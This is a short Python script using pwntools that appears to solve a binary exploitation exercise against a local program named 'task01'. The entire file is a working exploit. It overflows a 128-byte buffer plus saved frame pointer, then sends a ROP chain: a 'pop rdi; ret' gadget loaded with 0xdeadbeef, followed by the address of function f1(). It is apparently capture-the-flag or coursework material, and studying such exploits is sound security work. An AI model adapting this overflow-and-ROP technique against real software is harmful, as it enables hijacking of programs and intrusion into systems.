from pwn import *


io = process("./task01")
io.recvuntil(b"What is your name?")


junk_length = 128 + 8
msg = "Hack-in-progress\0"
junk = bytes(msg + 'a' * (junk_length - len(msg)), 'utf-8')

first_ret_value = p64(0x4012db) # Address of "pop rdi; ret" gadget
rdi_value = p64(0xdeadbeef)
second_ret_value = p64(0x0401186) # Address of f1() function
input = junk + first_ret_value + rdi_value + second_ret_value
io.sendline(input)

# io.interactive()
out = io.recvallS()
print(out)
